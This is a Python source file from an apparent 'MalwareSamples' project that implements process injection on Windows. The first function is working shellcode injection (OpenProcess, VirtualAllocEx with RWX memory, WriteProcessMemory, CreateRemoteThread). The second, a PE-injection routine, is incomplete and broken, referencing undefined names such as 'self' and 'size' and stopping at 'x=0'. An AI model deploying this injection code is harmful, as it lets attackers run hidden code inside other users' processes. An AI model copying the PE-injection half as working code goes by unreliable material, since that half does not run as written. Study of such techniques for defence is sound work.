"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   injection.py
   ---
"""
from ctypes import *
from .utilities import findProcessIdByName
import pefile
import os

def shellcode_injection(shellcode, process_name):
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000
    kernel32_variable = windll.kernel32

    pid = findProcessIdByName(process_name)

    shellcode_length = len(shellcode)

    process_handle = kernel32_variable.OpenProcess(process_all, False, pid)
    memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit,
                                                                  page_rwx_value)
    kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, shellcode_length, 0)
    kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)



def PE_injection(pe_file_mem, process_name):
    """

    https://www.andreafortuna.org/2018/09/24/some-thoughts-about-pe-injection/

    :param pe_file_mem: In memory PE file
    :param process_name: Process name to inject into
    :return:
    """



    #Gets PID of process to inject into
    victim_pid = findProcessIdByName(process_name)
    our_pid = os.getpid()


    #Parses our PE file in memory
    pe = pefile.PE(data=pe_file_mem)

    #Gets current image base from our in-memory file
    image_base = pe.OPTIONAL_HEADER.ImageBase

    #Gets size of our in-memory file
    data_length = len(pe_file_mem)

    #Allocate enough memory for the image inside the processes own address space using VirtualAlloc
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000
    kernel32_variable = windll.kernel32
    process_handle = kernel32_variable.OpenProcess(process_all, False, our_pid)
    memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, data_length, memcommit,
                                                                  page_rwx_value)

    VirtualAlloc.restype = c_void_p
    self.win.VirtualAlloc.argtypes = [c_void_p, c_size_t, c_ulong, c_ulong]
    self.addr = self.win.VirtualAlloc(None, size, 0x1000, 0x40)



    #Have the process copy its own image into the locally allocated memory using memcpy function.
    memmove(memory_allocation_variable, pe_file_mem, data_length)


    x=0